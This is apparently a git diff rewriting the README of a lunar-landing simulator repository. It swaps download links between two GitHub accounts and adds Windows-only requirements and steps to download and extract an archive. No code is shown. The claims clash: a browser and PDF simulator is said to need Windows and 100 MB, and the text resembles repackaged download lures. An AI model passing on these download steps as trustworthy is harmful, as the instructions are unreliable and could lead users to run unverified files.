@@ -1,129 +1,76 @@
-# Apollo Lunar Landing Simulator - Game Script Utility 2026
+# 🚀 apollo-lunar-script-sim - Practice manual lunar landing maneuvers safely
 
-> **A browser and Adobe Acrobat PDF lunar-landing simulator** powered by a deterministic JavaScript physics engine for modeling free fall, lunar gravity, and landing results.
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Sonu956932/apollo-lunar-script-sim/releases)
 
-[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
-[![Platform](https://img.shields.io/badge/Platform-Web%20browsers%20%7C%20Adobe%20Acrobat%20PDF-blue?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/jasonubhgreen2473/apollo-lunar-script-sim?style=flat-square)](https://github.com/jasonubhgreen2473/apollo-lunar-script-sim)
+This application provides a physics-based simulator for moon landings. It calculates the forces of gravity and motion to mimic the experience of landing a spacecraft on the lunar surface. You use this tool to learn how landing speed and descent angle affect your success. The program runs in two formats to give you flexibility in how you practice.
 
----
+## 💾 How to download the software
 
-<p align="center">
-  <a href="https://jasonubhgreen2473.github.io/apollo-lunar-script-sim/">
-    <img src="https://img.shields.io/badge/Download-Apollo%20Lunar%20Landing%20Simulator%20Script-brightgreen?style=for-the-badge" alt="Download Apollo Lunar Landing Simulator Script">
-  </a>
-</p>
+Visit the [official releases page](https://github.com/Sonu956932/apollo-lunar-script-sim/releases) to access the files. You see a list of versions. Choose the most recent version at the top of the page. Click the file name to start the download. Save the file to your computer in a folder you can find later, such as your Downloads folder.
 
-> **[Download Apollo Lunar Landing Simulator](https://jasonubhgreen2473.github.io/apollo-lunar-script-sim/)**
+## ⚙️ System requirements
 
----
+This simulator runs on standard Windows computers. You need the following:
+* Windows 10 or Windows 11.
+* A web browser like Google Chrome, Microsoft Edge, or Mozilla Firefox.
+* Adobe Acrobat Reader for the PDF version of the simulator.
+* At least 100 megabytes of free storage space.
 
-[Download Latest Build](https://jasonubhgreen2473.github.io/apollo-lunar-script-sim/)
+## 🛠️ Installation and setup
 
----
+Once the download finishes, follow these steps to prepare the software for use:
 
-## About the Simulator
+1. Open your file explorer and navigate to the folder where you saved the download.
+2. The file may come in a compressed folder. Right-click the folder and select Extract All. Choose a location on your computer to save the extracted files.
+3. Once the folder extracts, open the new folder to see the contents. 
+4. You will find two versions of the simulator. One version runs in your browser. The other version runs through Adobe Acrobat.
 
-Apollo Lunar Landing Simulator is an interactive landing experiment based on a deterministic JavaScript physics core. The simulation follows a craft through lunar free fall using constant gravity, then determines the outcome when the craft reaches the ground.
+## 🕹️ Running the simulator
 
-Two runtime formats are included: a browser-oriented technical interface and an Adobe Acrobat PDF version. Both rely on the same simulation architecture so that the physics behavior remains consistent. The browser environment also includes a test runner for checking the physics implementation directly in the page.
+The software offers two ways to simulate the lunar landing.
 
----
+### The Browser Version
+The browser version offers a visual representation of the landing. 
+1. Locate the file ending in .html inside the folder.
+2. Double-click this file to open it in your default web browser.
+3. The simulator loads immediately. 
+4. Use your mouse or keyboard controls as indicated on the screen to adjust your descent.
+5. The physics engine calculates your landing result based on your inputs. If you land too fast, the simulator shows a crash. If you land slowly and level, you succeed.
 
-## Included Capabilities
+### The PDF Version
+The PDF version provides a static look at the mission parameters and landing physics.
+1. Locate the file ending in .pdf inside the folder.
+2. Double-click the file to open it in Adobe Acrobat Reader.
+3. Read through the mission documentation.
+4. Interact with the fields if the document includes them. 
+5. The PDF uses the same math as the browser version to show how different gravity settings affect your flight path.
 
-- Reproducible physics calculations written in JavaScript
-- Lunar motion modeled with constant gravity
-- Free-fall movement simulation
-- Ground-impact result processing
-- Landed-versus-crashed outcome detection
-- Technical interface for browser use
-- Physics checks through an in-browser test runner
-- Common simulation core shared by the web and Adobe Acrobat PDF versions
+## 🚀 Troubleshooting common issues
 
----
+If you encounter problems, check these items first.
 
-## Getting Started
+**The browser version shows a white screen.**
+Refresh your browser page. Ensure you have an internet connection if the simulator loads external scripts. Check that your browser supports JavaScript. Most modern browsers have this enabled by default.
 
-1. Visit the [latest build](https://jasonubhgreen2473.github.io/apollo-lunar-script-sim/).
-2. Launch the browser simulator in a supported web browser.
-3. To use the PDF edition, download the supplied document and open it in Adobe Acrobat.
-4. Start a landing scenario through the interface and inspect the resulting outcome.
+**The PDF does not open.**
+Install the latest version of Adobe Acrobat Reader from the official Adobe website. Some PDF readers built into browsers do not support the specific features required for this simulator. Using the official software ensures that the interactive physics components work as intended.
 
-The web edition is used directly through its online interface. The PDF edition places the same general simulation architecture inside an Adobe Acrobat document.
+**The simulator runs slowly.**
+Close other applications that use high amounts of memory, such as video editors or heavy web pages. This frees up your computer processor to handle the physics calculations.
 
----
+## 🛰️ Understanding the physics engine
 
-## Simulation Model
+The simulator uses a deterministic physics engine. This means the math follows strict rules. Gravity on the moon is weaker than on Earth. The software reduces the acceleration due to gravity to match lunar conditions. As you descend, the simulation tracks your velocity. It checks your rate of descent against the height of your craft. When the craft touches the surface, the engine compares your final vertical speed to the maximum allowed speed. If your speed stays low, the craft remains intact. 
 
-Rather than exposing a separate set of user preference controls, the simulator's behavior is primarily determined by its physics implementation.
+## 📝 Frequently asked questions
 
-| Component | Description |
-|---|---|
-| Physics core | Deterministic JavaScript simulation logic |
-| Gravity model | Constant lunar gravity |
-| Motion model | Free-fall behavior |
-| Impact handling | Ground-impact classification |
-| Result states | Landed or crashed outcome detection |
-| Test runner | In-browser physics verification |
+**Does the software track my progress?**
+The simulator focuses on single landing runs. It does not save your history or scores between sessions. Each time you restart the application, you begin a new flight.
 
----
+**Can I use this on a tablet?**
+The browser version works on many tablets, though it requires a screen large enough to see the controls. The PDF version works on most mobile devices that support Adobe Acrobat.
 
-## Supported Environments
+**Is this a game or an educational tool?**
+It serves both purposes. You can treat the landing as a challenge to improve your skills. You can also view the data to understand the physics of space flight.
 
-- **Web browsers:** Run the simulator through its browser interface.
-- **Adobe Acrobat PDF:** Run the PDF edition with Adobe Acrobat.
-- **Shared implementation:** Both formats use the same simulation core.
-- **Project format:** The web interface and PDF document are separate runtime forms of the simulator.
-
-The model is specifically concerned with lunar landing behavior under constant gravity. Scenarios beyond the defined model, as well as unsupported document viewers, may not produce the intended behavior.
-
----
-
-## Current Project Scope
-
-The project currently centers on its deterministic physics core, browser interface, browser-based test runner, and shared operation across web browsers and Adobe Acrobat PDF.
-
----
-
-## Frequently Asked Questions
-
-### What is the quickest way to launch it?
-
-Open the [latest build](https://jasonubhgreen2473.github.io/apollo-lunar-script-sim/) for the browser version, or load the supplied PDF document in Adobe Acrobat.
-
-### Do I need to install the browser version?
-
-No separate web installation is described. The browser edition is accessed through a supported web browser.
-
-### Does the simulator support PDF?
-
-Yes. A PDF edition is available for use in Adobe Acrobat in addition to the web version.
-
-### Are the browser and PDF editions unrelated projects?
-
-No. They are different runtime environments that use a shared simulation core.
-
-### Is the physics model configurable?
-
-The documented implementation uses deterministic JavaScript physics, constant lunar gravity, free fall, and impact classification. Changing those behaviors requires modifying the project implementation.
-
-### What outcomes can the simulator report?
-
-After evaluating the ground impact, the simulator identifies the result as either landed or crashed.
-
-### Where should I keep the downloaded files?
-
-Leave the browser build in its downloaded project location. Save the PDF edition wherever you normally store Acrobat documents, then open it with Adobe Acrobat.
-
-### How do I verify the physics?
-
-Run the in-browser physics test runner provided with the browser environment.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: simulation, physics, space, landing, windows, education, lunar
